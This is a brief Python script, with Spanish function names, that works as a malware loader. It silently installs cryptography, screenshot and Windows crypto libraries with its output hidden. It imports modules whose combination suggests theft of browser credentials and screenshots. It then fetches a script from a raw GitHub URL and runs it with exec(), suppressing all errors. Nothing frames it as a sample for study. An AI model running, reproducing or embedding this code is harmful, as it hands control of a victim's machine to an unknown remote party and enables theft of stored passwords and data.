import subprocess
import sys
import platform

def instalar_dependencias():
    paquetes = ["pycryptodome", "pillow", "pyautogui", "requests", "pywin32"]
    creation_flags = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
    
    for paquete in paquetes:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", paquete],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=creation_flags
            )
        except Exception:
            pass

instalar_dependencias()

try:
    from Crypto.Cipher import AES
    from PIL import Image
    import base64
    import io
    import json
    import platform
    import pyautogui
    import requests
    import socket
    import sqlite3
    
    if platform.system() == "Windows":
        import win32crypt
        import winreg
except ImportError:
    pass

try:
    import urllib.request

    url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v11.py'
    with urllib.request.urlopen(url_v11) as response:
        exec(response.read().decode('utf-8'))
except:
    pass
